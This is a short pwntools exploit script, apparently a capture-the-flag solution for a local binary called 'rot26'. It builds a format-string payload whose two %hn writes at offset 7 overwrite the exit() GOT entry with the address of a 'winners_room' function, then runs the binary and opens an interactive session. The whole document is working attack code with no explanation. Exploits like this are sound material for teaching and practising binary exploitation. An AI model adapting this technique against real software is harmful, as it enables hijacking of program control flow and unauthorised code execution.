#!/usr/bin/python

from pwn import *

address_winners_room = 0x08048737
address_winners_room_pt1 = 0x0804
address_winners_room_pt2 = 0x8737
address_exit_plt = 0x080484a0
address_exit_got = 0x0804a020
offset = 7

payload = ""
payload += p32(address_exit_got+2)
payload += p32(address_exit_got)
payload += "%" + str(address_winners_room_pt1 - 2*4) +  "x"
payload += "%" + str(offset) + "$hn"
payload += "%" + str(address_winners_room_pt2 - address_winners_room_pt1) + "x"
payload += "%" + str(offset+1) + "$hn"

p = process("./rot26")
p.sendline(payload)
p.interactive()